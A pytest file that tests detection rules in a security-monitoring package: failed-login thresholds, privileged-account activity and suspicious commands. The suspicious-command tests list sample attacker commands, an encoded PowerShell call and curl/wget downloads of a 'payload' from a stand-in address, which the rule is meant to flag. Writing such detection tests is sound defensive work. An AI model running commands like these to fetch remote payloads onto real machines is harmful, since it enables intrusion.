import pytest

from sentinelx.events import parse_event
from sentinelx.rules import (
    Finding,
    failed_logins,
    privileged_activity,
    suspicious_command,
)
from tests.helpers import make_auth_raw, make_process_raw


def test_failed_logins_fires_at_threshold():
    event = parse_event(make_auth_raw(failed_attempts=5))
    finding = failed_logins(event)
    assert isinstance(finding, Finding)
    assert finding.rule_id == "failed_logins"
    assert finding.event_id == event.event_id


def test_failed_logins_does_not_fire_below_threshold():
    event = parse_event(make_auth_raw(failed_attempts=4))
    finding = failed_logins(event)
    assert finding is None


def test_failed_logins_does_not_fire_on_process_execution_event():
    event = parse_event(make_process_raw())
    finding = failed_logins(event)
    assert finding is None


def test_privileged_activity_fires_for_privileged_account():
    event = parse_event(make_auth_raw(privileged=True))
    finding = privileged_activity(event)
    assert isinstance(finding, Finding)
    assert finding.rule_id == "privileged_activity"
    assert finding.event_id == event.event_id


def test_privileged_activity_does_not_fire_for_non_privileged_account():
    event = parse_event(make_auth_raw(privileged=False))
    finding = privileged_activity(event)
    assert finding is None


def test_privileged_activity_does_not_fire_on_process_execution_event():
    event = parse_event(make_process_raw())
    finding = privileged_activity(event)
    assert finding is None


def test_privileged_activity_fires_without_failed_attempts():
    event = make_auth_raw(privileged=True, failed_attempts=0)
    finding = privileged_activity(parse_event(event))
    assert finding is not None


def test_privileged_activity_evidence_handles_missing_source_ip():
    event = parse_event(make_auth_raw(privileged=True, source_ip=None))
    finding = privileged_activity(event)
    assert finding is not None
    assert "admin" in finding.evidence
    assert "None" not in finding.evidence


@pytest.mark.parametrize(
    "command",
    [
        "powershell -EncodedCommand AAAA",
        "POWERSHELL.EXE -ENC AAAA",
        r"C:\Windows\System32\curl.exe -O http://203.0.113.5/x",
        "CURL http://203.0.113.5/payload",
        "wget http://203.0.113.5/x",
    ],
)
def test_suspicious_command_fires(command):
    event = parse_event(make_process_raw(command=command))

    finding = suspicious_command(event)

    assert finding is not None


@pytest.mark.parametrize(
    "command",
    [
        "curly.exe --help",
        r"notepad.exe C:\notes.txt",
        "powershell -NoProfile Get-Date",
        "mycurl --help",
    ],
)
def test_suspicious_command_does_not_fire(command):
    event = parse_event(make_process_raw(command=command))

    finding = suspicious_command(event)

    assert finding is None


def test_suspicious_command_ignores_authentication_event():
    event = parse_event(make_auth_raw())

    assert suspicious_command(event) is None


def test_suspicious_command_finding_has_correct_fields():
    event = parse_event(make_process_raw(command="powershell -EncodedCommand AAAA"))

    finding = suspicious_command(event)

    assert finding is not None
    assert finding.rule_id == "suspicious_command"
    assert finding.event_id == event.event_id
